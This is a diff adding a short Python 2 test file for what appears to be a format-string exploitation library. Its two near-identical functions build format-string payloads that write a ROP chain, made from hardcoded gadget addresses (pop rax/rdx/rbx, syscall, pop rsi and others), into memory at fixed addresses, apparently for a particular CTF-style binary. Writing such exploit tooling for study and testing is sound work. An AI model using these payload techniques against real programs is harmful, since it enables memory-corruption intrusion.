@@ -1,0 +1,40 @@
+from formatstr import payload
+
+def test_payload_64():
+    pop_rax_rdx_rbx = 0x0000000000482286
+    syscall = 0x471115
+    pop_rsi = 0x00000000004014a4
+    pop_rdi = 0x0000000000401f0a
+    pop_rsp = 0x00000000004005b5
+    bss = 0x6f0000
+
+    rop_addr = 0x6ef180
+    write_addr = {}
+    write_addr[0x6D6830] = 0x18eb
+    write_addr[rop_addr] = (pop_rax_rdx_rbx&0xffff)
+    write_addr[rop_addr+2] = ((pop_rax_rdx_rbx>>16)&0xffff)
+    write_addr[rop_addr+0x10] = 0x200
+    write_addr[rop_addr+0x20] = pop_rsi&0xffff
+    write_addr[rop_addr+0x22] = (pop_rsi>>16)&0xffff
+    return payload(8,write_addr,write_size=2,x64=1)
+
+def test_payload_32():
+    pop_rax_rdx_rbx = 0x0000000000482286
+    syscall = 0x471115
+    pop_rsi = 0x00000000004014a4
+    pop_rdi = 0x0000000000401f0a
+    pop_rsp = 0x00000000004005b5
+    bss = 0x6f0000
+
+    rop_addr = 0x6ef180
+    write_addr = {}
+    write_addr[0x6D6830] = 0x18eb
+    write_addr[rop_addr] = (pop_rax_rdx_rbx&0xffff)
+    write_addr[rop_addr+2] = ((pop_rax_rdx_rbx>>16)&0xffff)
+    write_addr[rop_addr+0x10] = 0x200
+    write_addr[rop_addr+0x20] = pop_rsi&0xffff
+    write_addr[rop_addr+0x22] = (pop_rsi>>16)&0xffff
+    return payload(8,write_addr,write_size=2,x64=0)
+    
+print test_payload_32()
+print test_payload_64()
